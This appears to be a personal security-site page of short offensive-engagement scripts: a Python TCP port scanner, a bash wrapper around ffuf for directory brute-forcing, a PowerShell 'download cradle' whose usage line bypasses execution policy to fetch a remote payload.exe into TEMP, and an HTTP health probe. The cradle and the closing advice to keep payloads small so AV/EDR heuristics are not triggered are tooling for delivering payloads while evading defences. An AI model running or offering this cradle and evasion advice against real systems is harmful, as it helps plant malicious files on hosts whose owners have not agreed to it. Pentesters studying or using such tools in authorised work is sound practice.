---
layout: cyberpunk
title: Utility Code Snippets
permalink: /code-snippets/
---

# Utility Code Snippets

Quick, reusable scripts for offensive security engagements. Each snippet includes minimal error handling, logging where appropriate, and placeholders to customize before use.

## Python: Minimal TCP Scanner

```python
#!/usr/bin/env python3
import argparse
import socket
from concurrent.futures import ThreadPoolExecutor


def scan_port(host: str, port: int, timeout: float = 1.5) -> tuple[int, bool]:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(timeout)
        return port, sock.connect_ex((host, port)) == 0


def main():
    parser = argparse.ArgumentParser(description="Lightweight TCP scanner")
    parser.add_argument("host", help="Target host or IP")
    parser.add_argument("ports", help="Comma-separated ports, e.g. 22,80,443")
    parser.add_argument("-t", "--timeout", type=float, default=1.5, help="Connection timeout in seconds")
    args = parser.parse_args()

    ports = sorted({int(p.strip()) for p in args.ports.split(",") if p.strip()})

    with ThreadPoolExecutor(max_workers=min(len(ports), 32)) as executor:
        for port, is_open in executor.map(lambda p: scan_port(args.host, p, args.timeout), ports):
            status = "open" if is_open else "closed"
            print(f"{args.host}:{port} -> {status}")


if __name__ == "__main__":
    main()
```

- **Usage:** `python3 tcp_scan.py 10.10.10.10 22,80,443`.
- **Notes:** The script avoids third-party dependencies and uses thread pooling for speed.

## Bash: Targeted Directory Bruteforce Wrapper

```bash
#!/usr/bin/env bash
set -euo pipefail

wordlist=${1:-/usr/share/wordlists/dirb/common.txt}
target=${2:?"Usage: $0 <wordlist> <http(s)://target>"}
output=${3:-"$(date +%Y%m%d-%H%M%S)-ffuf.log"}

ffuf -w "$wordlist" -u "$target/FUZZ" -recursion -recursion-depth 2 \
     -mc 200,204,301,302,307,401,403 -of md -o "$output"

echo "Results saved to $output"
```

- **Usage:** `./ffuf_wrapper.sh /path/to/list.txt https://target`.
- **Notes:** Saves Markdown output with a timestamp for quick reporting.

## PowerShell: Basic Web Download Cradle

```powershell
param(
    [Parameter(Mandatory = $true)] [string] $Uri,
    [string] $Destination = "$env:TEMP\\payload.bin"
)

try {
    Invoke-WebRequest -Uri $Uri -OutFile $Destination -UseBasicParsing -TimeoutSec 15
    Write-Host "File saved to $Destination"
} catch {
    Write-Error "Download failed: $_"
}
```

- **Usage:** `powershell -ExecutionPolicy Bypass -File fetch.ps1 -Uri https://example/payload.exe`.
- **Notes:** Keeps parsing simple for compatibility on older hosts.

## Python: HTTP Service Health Probe

```python
#!/usr/bin/env python3
import argparse
import logging
import sys
from http.client import HTTPConnection, HTTPSConnection

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")


def check(url: str, timeout: int = 3) -> int:
    scheme, host, path = parse_url(url)
    conn_cls = HTTPSConnection if scheme == "https" else HTTPConnection
    conn = conn_cls(host, timeout=timeout)
    conn.request("GET", path)
    resp = conn.getresponse()
    logging.info("%s -> %s %s", url, resp.status, resp.reason)
    return resp.status


def parse_url(url: str) -> tuple[str, str, str]:
    if not url.startswith(("http://", "https://")):
        raise ValueError("URL must start with http:// or https://")
    scheme, remainder = url.split("://", 1)
    host, _, path = remainder.partition("/")
    return scheme, host, f"/{path}" if path else "/"


def main() -> int:
    parser = argparse.ArgumentParser(description="HTTP service probe")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-t", "--timeout", type=int, default=3, help="Timeout in seconds")
    args = parser.parse_args()

    try:
        status = check(args.url, args.timeout)
    except Exception as exc:  # noqa: BLE001 - explicit error logging for field use
        logging.error("Probe failed: %s", exc)
        return 1
    return 0 if 200 <= status < 400 else 2


if __name__ == "__main__":
    sys.exit(main())
```

- **Usage:** `python3 http_probe.py https://target/health -t 5`.
- **Notes:** Returns non-zero exit codes when health checks fail, making it CI-friendly.

---

Use these snippets as starting points and adapt paths, timeouts, and logging for your environment. Keep payloads minimal to avoid triggering AV/EDR heuristics unnecessarily.
